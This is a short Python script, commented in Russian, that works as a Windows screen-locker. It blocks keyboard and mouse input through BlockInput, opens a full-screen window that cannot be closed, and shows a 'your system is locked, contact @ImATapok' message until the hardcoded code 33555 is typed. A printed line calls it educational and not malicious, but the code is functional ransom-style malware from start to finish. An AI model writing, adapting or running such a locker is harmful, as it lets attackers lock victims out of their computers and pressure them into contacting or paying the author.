import tkinter as tk
import ctypes
import os
import sys
import time

# Блокировка сочетаний клавиш
def block_keys():
    try:
        # Блокировка Alt+F4, Alt+Tab, Ctrl+Alt+Del и других
        ctypes.windll.user32.BlockInput(True)
    except:
        pass

# Создание полноэкранного окна
def create_lock_screen():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    
    # Запрет закрытия окна
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    # Настройка внешнего вида
    root.configure(bg='black')
    label = tk.Label(root, text="Ваша система заблокирована\nДля большей информации обратитесь к @ImATapok", 
                     font=("Arial", 40), fg="red", bg="black")
    label.pack(expand=True)
    
    # Поле для ввода кода
    entry = tk.Entry(root, font=("Arial", 24), justify='center')
    entry.pack(pady=20)
    
    # Кнопка проверки кода
    def check_code():
        if entry.get() == "33555":
            root.destroy()
            ctypes.windll.user32.BlockInput(False)
            sys.exit()
        else:
            entry.delete(0, tk.END)
            entry.insert(0, "Неверный код!")
    
    button = tk.Button(root, text="Разблокировать", command=check_code, 
                      font=("Arial", 20))
    button.pack(pady=10)
    
    root.mainloop()

if __name__ == "__main__":
    print("Образовательный скрипт запущен (не вредоносный)")
    block_keys()
    create_lock_screen()